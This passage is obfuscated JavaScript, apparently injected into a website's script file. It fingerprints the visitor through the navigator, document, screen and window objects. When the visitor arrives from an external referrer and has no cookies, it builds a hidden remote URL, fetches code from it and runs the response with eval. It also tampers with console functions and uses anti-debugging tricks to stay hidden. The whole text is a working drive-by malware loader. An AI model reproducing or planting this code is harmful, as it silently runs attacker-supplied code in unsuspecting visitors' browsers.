Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};